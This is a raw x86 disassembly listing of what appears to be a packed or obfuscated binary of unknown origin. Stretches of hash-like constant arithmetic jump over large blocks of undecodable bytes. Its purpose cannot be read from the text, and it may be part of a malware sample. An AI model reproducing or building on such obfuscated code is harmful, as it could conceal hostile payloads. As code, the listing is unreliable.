  40ed61:	mov    ecx,DWORD PTR [ebp-0xc]
  40ed64:	add    eax,0x80ca
  40ed69:	or     eax,ecx
  40ed6b:	mov    ecx,DWORD PTR ds:0x422794
  40ed71:	or     eax,0x686
  40ed76:	xor    eax,0x3eec
  40ed7b:	lea    eax,[eax+ecx*1-0xc11b]
  40ed82:	xor    DWORD PTR ds:0x42278c,eax
  40ed88:	mov    eax,DWORD PTR [ebp-0x64]
  40ed8b:	and    eax,0x4dff
  40ed90:	add    eax,DWORD PTR [ebp-0x14]
  40ed93:	mov    ecx,DWORD PTR [ebp-0x94]
  40ed99:	xor    eax,0x676c
  40ed9e:	xor    edx,edx
  40eda0:	div    ecx
  40eda2:	mov    ecx,DWORD PTR [ebp-0x24]
  40eda5:	mov    edx,DWORD PTR [ebp-0x74]
  40eda8:	xor    ecx,0x6e1e
  40edae:	imul   ecx,edx
  40edb1:	mov    edx,DWORD PTR [ebp+0x8]
  40edb4:	push   0x4
  40edb6:	push   0xe4c37b20
  40edbb:	xor    eax,0x3884
  40edc0:	mov    eax,DWORD PTR [eax+edx*1]
  40edc3:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  40edca:	mov    eax,DWORD PTR [ebp-0x34]
  40edcd:	mov    edx,DWORD PTR [ebp-0xb4]
  40edd3:	lea    eax,[edx+eax*1-0x76d2]
  40edda:	mov    edx,DWORD PTR [ebp-0x44]
  40eddd:	mov    esi,DWORD PTR [ebp-0x84]
  40ede3:	or     eax,edx
  40ede5:	xor    edx,edx
  40ede7:	div    esi
  40ede9:	mov    edx,DWORD PTR [ebp-0x54]
  40edec:	add    eax,0x43d7
  40edf1:	xor    eax,0x5e6a
  40edf6:	add    eax,DWORD PTR [edx+ecx*1]
  40edf9:	mov    ecx,DWORD PTR ds:0x42278c
  40edff:	add    DWORD PTR [eax],ecx
  40ee01:	mov    eax,DWORD PTR [ebp-0x90]
  40ee07:	mov    ecx,DWORD PTR [ebp-0x8c]
  40ee0d:	mov    edx,DWORD PTR [ebp-0xa0]
  40ee13:	mov    esi,DWORD PTR [ebp-0x9c]
  40ee19:	sub    edx,eax
  40ee1b:	mov    eax,DWORD PTR [ebp-0xb0]
  40ee21:	sbb    esi,ecx
  40ee23:	mov    ecx,DWORD PTR [ebp-0xac]
  40ee29:	xor    edx,eax
  40ee2b:	mov    eax,DWORD PTR [ebp-0xc0]
  40ee31:	xor    esi,ecx
  40ee33:	mov    ecx,DWORD PTR [ebp-0xbc]
  40ee39:	add    edx,eax
  40ee3b:	adc    esi,ecx
  40ee3d:	add    edx,0x2313
  40ee43:	adc    esi,0x2a00
  40ee49:	push   esi
  40ee4a:	push   edx
  40ee4b:	call   0x42226c
  40ee50:	mov    ecx,0x1207
  40ee55:	sub    ecx,eax
  40ee57:	push   0x0
  40ee59:	pop    eax
  40ee5a:	sbb    eax,edx
  40ee5c:	mov    edx,DWORD PTR ds:0x42278c
  40ee62:	xor    esi,esi
  40ee64:	jmp    0x40f1a7
  40ee69:	mov    bh,0x51
  40ee6b:	lods   eax,DWORD PTR ds:[esi]
  40ee6c:	xchg   edi,eax
  40ee6d:	mov    ebx,0x8571b7bb
  40ee72:	pop    ecx
  40ee73:	xor    ch,bl
  40ee75:	fsubr  DWORD PTR [eax-0x72]
  40ee78:	nop
  40ee79:	in     eax,dx
  40ee7a:	adc    bh,BYTE PTR [esi-0x413bfe42]
  40ee80:	mov    esi,0xc20854f0
  40ee85:	jb     0x40eecf
  40ee87:	mov    edi,0xb3130f1
  40ee8c:	ins    BYTE PTR es:[edi],dx
  40ee8d:	aam    0x81
  40ee8f:	push   ds
  40ee90:	cmp    eax,0x3c787e0d
  40ee95:	push   edi
  40ee96:	hlt    
  40ee97:	mov    edx,DWORD PTR [eax]
  40ee99:	jmp    0x46d6c811
  40ee9e:	push   esi
  40ee9f:	and    BYTE PTR [esi+0x19f9bfed],bh
  40eea5:	and    DWORD PTR [edi+0x9f83ea9],eax
  40eeab:	jp     0x40eec2
  40eead:	cmp    esi,ebp
  40eeaf:	adc    BYTE PTR [esi+0x589dd02f],cl
  40eeb5:	(bad)
  40eeb8:	pop    ebx
  40eeb9:	repnz (bad) 
  40eebb:	scas   eax,DWORD PTR es:[edi]
  40eebc:	imul   esp,DWORD PTR [ebp-0x34],0x2
  40eec0:	cwde   
  40eec1:	mov    esi,0x5f9b454f
  40eec6:	inc    esp
  40eec7:	sbb    al,0xae
  40eec9:	jnp    0x40eea8
  40eecb:	pusha  
  40eecc:	dec    esi
  40eecd:	addr16 loope 0x40ef46
  40eed0:	jnp    0x40eee0
  40eed2:	xchg   ecx,eax
  40eed3:	sbb    eax,0xb55c7233
  40eed8:	ss xor eax,esp
  40eedb:	ret    0x6c78
  40eede:	add    bl,0x74
  40eee1:	sbb    al,0x1e
  40eee3:	mov    edi,0xbe41a634
  40eee8:	mov    esi,DWORD PTR [esi]
  40eeea:	sbb    dh,BYTE PTR [ebp-0x64076663]
  40eef0:	jmp    DWORD PTR [ecx+0x64fdf67c]
  40eef6:	fdiv   DWORD PTR [eax+0x72]
  40eef9:	xchg   ecx,eax
  40eefa:	test   eax,0x89ce4ea7
  40eeff:	or     DWORD PTR [ebx],0xffffffc2
  40ef02:	jmp    0xbea0accc
  40ef07:	pop    ss
  40ef08:	test   eax,0xcb33fd34
  40ef0d:	dec    edx
  40ef0e:	mov    bl,0x19
  40ef10:	push   ss
  40ef11:	pop    esi
  40ef12:	dec    esp
  40ef13:	out    0x56,al
  40ef15:	xor    al,0x13
  40ef17:	lea    edx,[esi+0x2e23cc0f]
  40ef1d:	push   0x846a8095
  40ef22:	cld    
  40ef23:	xor    DWORD PTR [edx+ecx*2-0x6ce72282],ebx
  40ef2a:	(bad)  
  40ef2b:	nop
  40ef2c:	jne    0x40ef29
  40ef2e:	jnp    0x40ef9a
  40ef30:	dec    ebx
  40ef31:	fldcw  WORD PTR [ebx+0x29]
  40ef34:	sar    DWORD PTR ds:0x36818629,0xe2
  40ef3b:	and    DWORD PTR [edx-0x539b5b01],esi
  40ef41:	add    al,0xc1
  40ef43:	sub    BYTE PTR [ecx+0x45b79a92],al
  40ef49:	or     BYTE PTR [esi+0x7352371f],bl
  40ef4f:	in     eax,0x94
  40ef51:	push   ds
  40ef52:	sbb    BYTE PTR [ecx-0x480541f9],0xc4
  40ef59:	ret    0xc841
  40ef5c:	inc    edi
  40ef5d:	mov    bl,0x7c
  40ef5f:	xor    ch,bh
  40ef61:	pushf  
  40ef62:	fcmovu st,st(1)
  40ef64:	add    BYTE PTR [ecx-0x4c7969a],0xfd
  40ef6b:	jae    0x40ef1e
  40ef6d:	or     eax,0x5b08d3fa
  40ef72:	cwde   
  40ef73:	pushf  
  40ef74:	outs   dx,BYTE PTR ds:[esi]
  40ef75:	in     al,dx
  40ef76:	adc    BYTE PTR [esi+edi*2],dh
  40ef79:	xchg   BYTE PTR fs:[ebp-0x5fba549],dl
  40ef80:	rcr    ecx,cl
  40ef82:	loopne 0x40ef49
  40ef84:	xchg   BYTE PTR [eax+0x3c7ee3c6],bl
  40ef8a:	ja     0x40efaa
  40ef8c:	fld    DWORD PTR [ecx+0x7c74776a]
  40ef92:	ds mov eax,0xef227ab7
  40ef98:	aaa    
  40ef99:	cwde   
  40ef9a:	adc    BYTE PTR [ebp+0x3b73fc60],dl
  40efa0:	xor    DWORD PTR [esi+0x11],ecx
  40efa3:	fmul   QWORD PTR [ebx-0x2a9da7e3]
  40efa9:	jb     0x40eff2
  40efab:	shl    BYTE PTR [edx-0xaf86919],0x6f
  40efb2:	push   edi
  40efb3:	xchg   BYTE PTR [edi-0x322bd0ac],bl
  40efb9:	ret    
  40efba:	ins    BYTE PTR es:[edi],dx
  40efbb:	jmp    0x40ef46
  40efbd:	push   0xffffffbd
  40efbf:	sub    eax,0xfe1fca7d
  40efc4:	mov    cl,0x5d
  40efc6:	xor    esp,0xb
  40efc9:	in     eax,0x59
  40efcb:	mov    ebx,0x7eb6f23a
  40efd0:	mov    ebp,0xfe67a357
  40efd5:	xchg   ebp,eax
  40efd6:	xchg   DWORD PTR [ecx+0x37137727],ebp
  40efdc:	pop    ebp
  40efdd:	aad    0xfd
  40efdf:	ret    0xc17b
  40efe2:	(bad)  [eax-0x4639f5ff]
  40efe8:	pop    ds
  40efe9:	push   ebx
  40efea:	int3   
  40efeb:	sbb    ebp,DWORD PTR [esi+0x4a]
  40efee:	out    dx,al
  40efef:	mov    dh,0xa7
  40eff1:	cli    
  40eff2:	sub    cl,ch
  40eff4:	dec    edx
  40eff5:	mov    ah,0x9d
  40eff7:	loope  0x40eff2
  40eff9:	ja     0x40efc3
  40effb:	cmp    DWORD PTR [edx-0x5c],edx
  40effe:	dec    eax
  40efff:	sbb    al,0x47
  40f001:	jge    0x40efba
  40f003:	jp     0x40f07b
  40f005:	imul   edx,DWORD PTR [ebp+0x6],0xffffffa7
  40f009:	fcom   QWORD PTR [esi+ebx*2+0x34]
  40f00d:	(bad)  
  40f00e:	xchg   edx,eax
  40f00f:	sbb    esp,eax
  40f011:	mov    cl,0x5b
  40f013:	mov    dh,0xf2
  40f015:	push   eax
  40f016:	jmp    FWORD PTR [ebp+0x427bd4]
  40f01c:	jno    0x40efe0
  40f01e:	add    ah,dl
  40f020:	fdivr  QWORD PTR [eax+ebx*4-0x48c20f3a]
  40f027:	lock pop es
  40f029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f02a:	mov    BYTE PTR [edx-0x5641f863],dl
  40f030:	xor    ebp,DWORD PTR [esp+ebp*4]
  40f033:	mov    ch,0x7a
  40f035:	mov    eax,0x889bca83
  40f03a:	aas    
  40f03b:	dec    esp
  40f03c:	cld    
  40f03d:	mov    edi,0xc4b4c2d3
  40f042:	in     al,0x96
  40f044:	fmul   st,st(4)
  40f046:	fcmovb st,st(5)
  40f048:	xchg   ch,bh
  40f04a:	stos   DWORD PTR es:[edi],eax
  40f04b:	jg     0x40f049
  40f04d:	(bad)  
  40f04e:	push   ebx
  40f04f:	inc    ebp
  40f050:	jge    0x40f037
  40f052:	mov    ch,0xb1
  40f054:	mov    ss,WORD PTR [ebp+0x44]
  40f057:	loopne 0x40efe2
  40f059:	push   es
  40f05a:	call   ebp
  40f05c:	ins    DWORD PTR es:[edi],dx
  40f05d:	fdiv   QWORD PTR [esi+0x25a8e51]
  40f063:	stos   DWORD PTR es:[edi],eax
  40f064:	inc    esp
  40f065:	mov    ebx,0x96c5f970
  40f06a:	call   0x9f16:0x717ee468
  40f071:	(bad)  
  40f072:	pushf  
  40f073:	push   eax
  40f074:	scas   al,BYTE PTR es:[edi]
  40f075:	rcl    DWORD PTR [eax-0x61],cl
  40f078:	fs daa 
  40f07a:	fwait
  40f07b:	mov    ds:0xcea441d0,eax
  40f080:	hlt    
  40f081:	sbb    DWORD PTR [eax+0x27],0x40
  40f085:	stc    
  40f086:	arpl   sp,bp
  40f088:	xchg   ebx,eax
  40f089:	cmp    bh,BYTE PTR [edi+edx*4-0x6e]
  40f08d:	pop    ss
  40f08e:	(bad)  
  40f08f:	int    0xac
  40f091:	dec    eax
  40f092:	push   ds
  40f093:	jecxz  0x40f0b1
  40f095:	lods   al,BYTE PTR ds:[esi]
  40f096:	(bad)  
  40f097:	fild   QWORD PTR [edx-0x2734fe23]
  40f09d:	gs inc edx
  40f09f:	pop    ebx
  40f0a0:	clc    
  40f0a1:	bound  edi,QWORD PTR [edx+eiz*1-0x9fc61fc]
  40f0a8:	ja     0x40f0d2
  40f0aa:	xor    al,0x9c
  40f0ac:	push   esp
  40f0ad:	mov    dl,0xfe
  40f0af:	xchg   esp,eax
  40f0b0:	addr16 aas 
  40f0b2:	daa    
  40f0b3:	inc    ebp
  40f0b4:	pop    ds
  40f0b5:	cmp    edx,DWORD PTR [ebx-0x24]
  40f0b8:	xchg   edx,eax
  40f0b9:	sbb    al,0xc
  40f0bb:	xor    ebx,ebp
  40f0bd:	in     eax,dx
  40f0be:	pop    ds
  40f0bf:	or     cl,BYTE PTR [ebx]
  40f0c1:	ret    0x9c06
  40f0c4:	sbb    bh,BYTE PTR [esi*2-0x1ab37276]
  40f0cb:	push   ss
  40f0cc:	dec    eax
  40f0cd:	mov    dl,dl
  40f0cf:	sub    eax,DWORD PTR [eax+esi*2]
  40f0d2:	jbe    0x40f0e8
  40f0d4:	cli    
  40f0d5:	xlat   BYTE PTR ds:[ebx]
  40f0d6:	adc    DWORD PTR [ebx],eax
  40f0d8:	adc    ecx,DWORD PTR [ecx]
  40f0da:	lahf   
  40f0db:	fidiv  DWORD PTR [esi-0x5155f1f0]
  40f0e1:	repnz es sbb al,0x4a
  40f0e5:	neg    BYTE PTR [ecx]
  40f0e7:	cmp    eax,0xf97ebf65
  40f0ec:	sub    eax,0xf0a3ab69
  40f0f1:	dec    esi
  40f0f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0f3:	push   ss
  40f0f4:	mov    ebp,0x837cafd3
  40f0f9:	stc    
  40f0fa:	iret   
  40f0fb:	out    dx,eax
  40f0fc:	xor    DWORD PTR [edi+0x5],0x6d
  40f100:	mov    bl,0xc2
  40f102:	jge    0x40f167
  40f104:	popa   
  40f105:	call   0xdbdd820c
  40f10a:	dec    ebp
  40f10b:	jmp    0xfd43:0x7122a229
  40f112:	mov    ecx,0x1c1fd120
  40f117:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f118:	loope  0x40f113
  40f11a:	xor    esp,DWORD PTR [esi-0x2216abd5]
  40f120:	loope  0x40f0ac
  40f122:	pop    ecx
  40f123:	outs   dx,DWORD PTR ds:[esi]
  40f124:	jp     0x40f0f0
  40f126:	inc    ebp
  40f127:	pop    ebp
  40f128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f129:	pop    esi
  40f12a:	push   0xffffff85
  40f12c:	lds    eax,FWORD PTR [ebx]
  40f12e:	and    edx,ebx
  40f130:	out    dx,al
  40f131:	iret   
  40f132:	sbb    eax,0x8ec79cd5
  40f137:	mov    edi,0x73b21e36
  40f13c:	xor    eax,0x90e3a008
  40f141:	sub    BYTE PTR [edi],bh
  40f143:	and    edx,ebp
  40f145:	call   0xca635082
  40f14a:	jno    0x40f0da
  40f14c:	mov    bh,0xb2
  40f14e:	dec    esi
  40f14f:	mov    esp,0x5cc19cac
  40f154:	sbb    al,dl
  40f156:	rcr    BYTE PTR [ebx],1
  40f158:	dec    edi
  40f159:	fmulp  st(4),st
  40f15b:	adc    cl,ch
  40f15d:	nop
  40f15e:	dec    eax
  40f15f:	pop    esp
  40f160:	int    0x9d
  40f162:	jnp    0x40f1dc
  40f164:	dec    ebx
  40f165:	lods   eax,DWORD PTR ds:[esi]
  40f166:	sub    eax,0xe4f520bb
  40f16b:	add    al,0xf0
  40f16d:	stos   DWORD PTR es:[edi],eax
  40f16e:	dec    eax
  40f16f:	ficom  WORD PTR [ebx+0x55]
  40f172:	sub    al,0x40
  40f174:	mov    dh,0xb6
  40f176:	mov    bl,0x21
  40f178:	sti    
  40f179:	sub    ebx,DWORD PTR [ebp-0x5e]
  40f17c:	add    BYTE PTR [edi],dh
  40f17e:	mov    eax,0x6af79819
  40f183:	and    BYTE PTR [edi+0x4693ba6a],ch
  40f189:	enter  0x2c60,0xbf
  40f18d:	jbe    0x40f1e2
  40f18f:	ret    0x66af
  40f192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f193:	mov    ebx,0xa4a7ab94
  40f198:	(bad)  
  40f199:	mov    esi,0xcf0f27de
  40f19e:	inc    edx
  40f19f:	push   edx
  40f1a0:	repnz mov ebx,0xd73df0e5
  40f1a6:	mov    WORD PTR [ebx],?
  40f1a8:	ror    DWORD PTR [edi],1
  40f1aa:	test   DWORD PTR ds:0x3b000000,ebp
  40f1b0:	lock jne 0x40f1dc
  40f1b7:	mov    eax,DWORD PTR [ebp-0x4]
  40f1ba:	mov    ecx,DWORD PTR [ebp-0x8]
  40f1bd:	add    eax,0x4296
  40f1c2:	shr    eax,0x2
  40f1c5:	or     eax,ecx
  40f1c7:	mov    ecx,DWORD PTR [ebp-0x10]
  40f1ca:	xor    eax,ecx
  40f1cc:	xor    eax,0x4e94
  40f1d1:	add    eax,DWORD PTR ds:0x42278c
  40f1d7:	mov    ds:0x422794,eax
  40f1dc:	pop    esi
  40f1dd:	leave  
  40f1de:	ret    0x4
  40f1e1:	push   ebp
  40f1e2:	mov    ebp,esp
  40f1e4:	sub    esp,0x58
  40f1e7:	push   ebx
  40f1e8:	push   esi
  40f1e9:	jmp    0x40f59d
  40f1ee:	jne    0x40f25e
  40f1f0:	mov    ds:0xb73caafc,al
  40f1f5:	je     0x40f1e5
  40f1f7:	fsubr  QWORD PTR [ecx+edx*8+0x43]
  40f1fb:	lods   al,BYTE PTR ds:[esi]
  40f1fc:	pushf  
  40f1fd:	jecxz  0x40f230
  40f1ff:	sbb    BYTE PTR [esi-0x413b1c42],bh
  40f205:	mov    esi,0x923041fe
  40f20a:	sti    
  40f20b:	ss inc eax
  40f20d:	outs   dx,BYTE PTR ds:[esi]
  40f20e:	or     ecx,DWORD PTR [eax]
  40f210:	sub    BYTE PTR [ebx],0x21
  40f213:	xlat   BYTE PTR ds:[ebx]
  40f214:	adc    ebx,ebp
  40f216:	out    dx,eax
  40f217:	mov    ch,0x68
  40f219:	inc    ecx
  40f21a:	adc    BYTE PTR [edi+0x36a12c2d],dh
  40f220:	pop    es
  40f221:	xchg   ebp,eax
  40f222:	add    edx,DWORD PTR [ecx]
  40f224:	mov    ds:0x8470bb2d,eax
  40f229:	cld    
  40f22a:	les    esi,FWORD PTR [esi-0x28]
  40f22d:	jbe    0x40f27c
  40f22f:	jl     0x40f201
  40f231:	mov    ds,edi
  40f233:	mov    ds:0xfdfa4cc4,al
  40f238:	call   0xceefb186
  40f23d:	sbb    eax,0x12f05988
  40f242:	sub    ecx,DWORD PTR [esi+0x1eb80e]
  40f248:	dec    eax
  40f249:	cmp    esp,DWORD PTR [eax+0x64]
  40f24c:	in     al,dx
  40f24d:	test   BYTE PTR [esi-0x249bb62d],bh
  40f253:	leave  
  40f254:	inc    ecx
  40f255:	inc    ebp
  40f256:	clc    
  40f257:	or     eax,0xfa9e99e3
  40f25c:	sub    eax,0xd7f12afa
  40f261:	ja     0x40f2d5
  40f263:	sbb    ah,bh
  40f265:	ficomp DWORD PTR [edi+ebx*8-0x4f]
  40f269:	dec    ebx
  40f26a:	std    
  40f26b:	sbb    bh,dh
  40f26d:	mov    bh,0x9
  40f26f:	xchg   BYTE PTR ds:0x8b50972f,dl
  40f275:	dec    ebx
  40f276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f277:	sbb    al,0x43
  40f279:	imul   esp,DWORD PTR [edx],0x12
  40f27c:	jae    0x40f29c
  40f27e:	je     0x40f273
  40f280:	ficomp WORD PTR [esi]
  40f282:	sbb    ecx,ecx
  40f284:	into   
  40f285:	call   0x135f4eb4
  40f28a:	mov    ch,0x6d
  40f28c:	mov    eax,ds:0xe4a8458a
  40f291:	fwait
  40f292:	sbb    BYTE PTR [edi],al
  40f294:	add    eax,0xfbf1f680
  40f299:	js     0x40f2cf
  40f29b:	sahf   
  40f29c:	das    
  40f29d:	xchg   ecx,eax
  40f29e:	sbb    BYTE PTR [edi-0x17],bh
  40f2a1:	js     0x40f235
  40f2a3:	mov    eax,ds:0x76b7533b
  40f2a8:	std    
  40f2a9:	out    dx,al
  40f2aa:	xchg   BYTE PTR [ebp-0x1c],dh
  40f2ad:	cmp    esi,DWORD PTR [ecx-0x62]
  40f2b0:	loop   0x40f234
  40f2b2:	(bad)  
  40f2b3:	ja     0x40f333
  40f2b5:	aam    0xe4
  40f2b7:	sub    bl,0xd7
  40f2ba:	dec    edx
  40f2bb:	loop   0x40f2da
  40f2bd:	xor    esi,DWORD PTR ds:0x8c2ee33f
  40f2c3:	mov    al,0x37
  40f2c5:	xchg   ebp,eax
  40f2c6:	daa    
  40f2c7:	or     BYTE PTR [edi],cl
  40f2c9:	je     0x40f2e2
  40f2cb:	push   ds
  40f2cc:	adc    DWORD PTR [edi+0x52],edi
  40f2cf:	sub    DWORD PTR [ecx-0x17],esi
  40f2d2:	sbb    al,0x8d
  40f2d4:	dec    ecx
  40f2d5:	std    
  40f2d6:	adc    ebp,ebp
  40f2d8:	add    BYTE PTR [edi],dl
  40f2da:	mov    edx,0x645ee2f6
  40f2df:	lahf   
  40f2e0:	std    
  40f2e1:	mov    edx,0xb95c994c
  40f2e6:	sbb    al,0xc1
  40f2e8:	and    DWORD PTR [eax],0xe418e678
  40f2ee:	mov    BYTE PTR [edx+0x7187ef7e],0x62
  40f2f5:	ins    DWORD PTR es:[edi],dx
  40f2f6:	add    al,0xdc
  40f2f8:	jecxz  0x40f2d9
  40f2fa:	sahf   
  40f2fb:	fcos   
  40f2fd:	adc    BYTE PTR [eax],0x1b
  40f300:	std    
  40f301:	mov    BYTE PTR [edi],ah
  40f303:	jecxz  0x40f304
  40f305:	in     al,0xc1
  40f307:	outs   dx,DWORD PTR ds:[esi]
  40f308:	retf   
  40f309:	sub    eax,0xf546937b
  40f30e:	mov    ss,WORD PTR [edx-0x6b]
  40f311:	xchg   esi,eax
  40f312:	dec    ecx
  40f313:	pusha  
  40f314:	mov    DWORD PTR [eax],esi
  40f316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f317:	bound  esi,QWORD PTR [ebx-0x490b9094]
  40f31d:	fs retf 
  40f31f:	fs dec eax
  40f321:	push   ecx
  40f322:	in     eax,0xde
  40f324:	or     ch,BYTE PTR [eax+0x5d12833b]
  40f32a:	or     BYTE PTR [edx+ecx*8],bh
  40f32d:	dec    esp
  40f32e:	inc    esp
  40f32f:	das    
  40f330:	dec    BYTE PTR [edi-0x2a21be4c]
  40f336:	arpl   WORD PTR [esi],bx
  40f338:	xor    esp,DWORD PTR [edi-0x80]
  40f33b:	ret    
  40f33c:	xchg   BYTE PTR [ecx],al
  40f33e:	fdivr  QWORD PTR [ebx-0x6019b64d]
  40f344:	mov    ebx,0x7e9d5ea6
  40f349:	add    BYTE PTR [ebx-0x25],bl
  40f34c:	div    DWORD PTR [ecx+eax*2+0x0]
  40f350:	(bad)  
  40f351:	loop   0x40f301
  40f353:	push   edx
  40f354:	pop    es
  40f355:	fidiv  DWORD PTR [eax-0x5a]
  40f358:	das    
  40f359:	sub    eax,0xefa2764e
  40f35e:	in     eax,0x55
  40f360:	pop    esp
  40f361:	test   BYTE PTR [esi-0xc],dl
  40f364:	and    ebx,DWORD PTR [esi]
  40f366:	jne    0x40f351
  40f368:	xchg   cl,al
  40f36a:	push   cs
  40f36b:	mov    cl,0xba
  40f36d:	ja     0x40f357
  40f36f:	sub    DWORD PTR [edi+ebx*8+0x4b],ecx
  40f373:	rol    DWORD PTR [eax+0x37],cl
  40f376:	mov    ecx,fs
  40f378:	sub    al,0x2f
  40f37a:	jo     0x40f339
  40f37c:	addr16 test eax,0x78def704
  40f382:	int    0x3a
  40f384:	cmp    dh,bl
  40f386:	ins    DWORD PTR es:[edi],dx
  40f387:	mov    dh,0xcb
  40f389:	out    dx,eax
  40f38a:	inc    edi
  40f38b:	xchg   esi,eax
  40f38c:	std    
  40f38d:	mov    cl,0xc1
  40f38f:	xchg   esp,eax
  40f390:	push   edx
  40f391:	mov    ch,0x98
  40f393:	push   cs
  40f394:	popa   
  40f395:	jbe    0x40f3be
  40f397:	fadd   st(4),st
  40f399:	test   DWORD PTR [ebp-0x37dcb25c],ecx
  40f39f:	sbb    ch,BYTE PTR [ecx-0x23ff0bdb]
  40f3a5:	ds pushf 
  40f3a7:	inc    ebx
  40f3a8:	sub    ebp,esi
  40f3aa:	aam    0xed
  40f3ac:	dec    ecx
  40f3ad:	jmp    0x8ce97062
  40f3b2:	cmp    cl,cl
  40f3b4:	or     edx,DWORD PTR [ebp-0x7f]
  40f3b7:	inc    eax
  40f3b8:	mov    ?,WORD PTR [edi+edi*4-0x1deec895]
  40f3bf:	inc    eax
  40f3c0:	pushf  
  40f3c1:	mov    cl,0x14
  40f3c3:	in     al,0xa9
  40f3c5:	xor    ecx,DWORD PTR [esi-0x4d]
  40f3c8:	test   BYTE PTR [edi-0x5e],0x99
  40f3cc:	mov    cl,0x42
  40f3ce:	and    esp,DWORD PTR [edx-0x17]
  40f3d1:	mov    dh,BYTE PTR ds:0xf9655014
  40f3d7:	cmp    eax,0x60eeaaa0
  40f3dc:	pusha  
  40f3dd:	sub    al,BYTE PTR [ebp+0x1213a30]
  40f3e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3e4:	add    al,BYTE PTR [ebp+0x332d1317]
  40f3ea:	out    0x19,eax
  40f3ec:	(bad)  
  40f3ed:	mov    bh,0x7c
  40f3ef:	mov    bh,cl
  40f3f1:	in     al,0xc2
  40f3f3:	fadd   st,st(4)
  40f3f5:	mul    DWORD PTR [edi+0x6b]
  40f3f8:	scas   eax,DWORD PTR es:[edi]
  40f3f9:	mov    ecx,0x603f21d9
  40f3fe:	jns    0x40f445
  40f400:	aas    
  40f401:	add    eax,0x27ec51ac
  40f406:	(bad)
  40f409:	int    0x0
  40f40b:	mov    ds:0xfc5e6e55,al
  40f410:	into   
  40f411:	test   bh,0xcb
  40f414:	mov    ecx,0x3062de42
  40f419:	aam    0x9d
  40f41b:	mov    ah,0x62
  40f41d:	add    DWORD PTR [eax],esp
  40f41f:	push   0x8504bb15
  40f424:	sub    dl,BYTE PTR [edi+eiz*8-0x4f]
  40f428:	push   edi
  40f429:	jo     0x40f3d1
  40f42b:	(bad)  
  40f42c:	and    eax,0xceae4429
  40f431:	push   0x9160111
  40f436:	jmp    0x40f44e
  40f438:	enter  0xdd71,0x94
  40f43c:	dec    ebp
  40f43d:	add    BYTE PTR [ebx+eiz*2-0x9],0x8d
  40f442:	pushf  
  40f443:	mov    eax,0xb53b6971
  40f448:	ja     0x379138a8
  40f44e:	bound  ebp,QWORD PTR [esi-0x2f]
  40f451:	dec    eax
  40f452:	mov    al,ds:0x4ee61842
  40f457:	mov    ebp,0x93cf7521
  40f45c:	inc    esi
  40f45d:	and    eax,0xa5442118
  40f462:	fs jp  0x40f4e4
  40f465:	clc    
  40f466:	(bad)  
  40f467:	sti    
  40f468:	data16 ins BYTE PTR es:[edi],dx
  40f46a:	inc    esi
  40f46b:	in     eax,0x66
  40f46d:	das    
  40f46e:	stos   BYTE PTR es:[edi],al
  40f46f:	dec    esi
  40f470:	adc    ecx,eax
  40f472:	cs fwait
  40f474:	or     BYTE PTR [ecx+0x33016e5c],dh
  40f47a:	xchg   DWORD PTR [edi-0x6bdad6c9],eax
  40f480:	jle    0x40f402
  40f482:	jmp    esi
  40f484:	add    DWORD PTR [ebx+edi*8],0xaaa8a71d
  40f48b:	pop    esp
  40f48c:	lahf   
  40f48d:	pop    edx
  40f48e:	mov    eax,ds:0x1d929313
  40f493:	sbb    al,0x94
  40f495:	inc    ebp
  40f496:	jb     0x40f508
  40f498:	enter  0xf18c,0x6f
  40f49c:	add    ecx,DWORD PTR ds:0x880be1a6
  40f4a2:	inc    ebp
  40f4a3:	xor    eax,0x5f4e60f0
  40f4a8:	bound  ecx,QWORD PTR [eax-0x3a948fd0]
  40f4ae:	or     eax,0xcfad5efb
  40f4b3:	mov    esp,0xbb7ef705
  40f4b8:	lahf   
  40f4b9:	pop    ebx
  40f4ba:	mov    BYTE PTR [ecx],dh
  40f4bc:	setbe  BYTE PTR [ebx]
  40f4bf:	adc    DWORD PTR ds:0xecbfe796,esi
  40f4c5:	mov    ecx,DWORD PTR [ebx+0x58]
  40f4c8:	stos   DWORD PTR es:[edi],eax
  40f4c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4cb:	cmp    bl,BYTE PTR [eax-0x29996224]
  40f4d1:	dec    esi
  40f4d2:	rcr    DWORD PTR [ecx],0xa5
  40f4d5:	and    BYTE PTR [ecx],cl
  40f4d7:	sbb    BYTE PTR [esi],cl
  40f4d9:	xchg   edx,eax
  40f4da:	sbb    dl,BYTE PTR [edx]
  40f4dc:	test   al,0x48
  40f4de:	mov    dl,ch
  40f4e0:	ds xchg esi,eax
  40f4e2:	(bad)
  40f4e5:	mov    ds:0xdeb8d11a,al
  40f4ea:	out    0xb1,eax
  40f4ec:	imul   ebp,DWORD PTR [ebx-0x48],0xc245f446
  40f4f3:	fisubr WORD PTR ss:[edi]
  40f4f6:	xor    eax,0xf73d2c75
  40f4fb:	fsub   DWORD PTR [ebp+0x690f84f2]
  40f501:	adc    edx,0x48
  40f504:	xor    edx,ebx
  40f506:	aad    0x81
  40f508:	js     0x40f559
  40f50a:	jecxz  0x40f4f0
  40f50c:	icebp  
  40f50d:	rol    ebx,1
  40f50f:	xor    DWORD PTR [eax+0x41],ebp
  40f512:	cmp    eax,0x720983e2
  40f517:	test   BYTE PTR [edx+0x7a],dh
  40f51a:	jecxz  0x40f55a
  40f51c:	xchg   edi,eax
  40f51d:	scas   eax,DWORD PTR es:[edi]
  40f51e:	fs or  ecx,esi
  40f521:	retf   
  40f522:	xor    eax,0x6d36743e
  40f527:	stos   DWORD PTR es:[edi],eax
  40f528:	pop    esi
  40f529:	add    DWORD PTR [ebx-0x4dfa7563],0xb345092
  40f533:	ret    0x71d
  40f536:	repnz scas al,BYTE PTR es:[edi]
  40f538:	mov    al,0xb8
  40f53a:	cmp    eax,0xd80521bb
  40f53f:	mov    edx,0x51694e31
  40f544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f545:	jl     0x40f567
  40f547:	in     al,dx
  40f548:	inc    ecx
  40f549:	out    0x92,eax
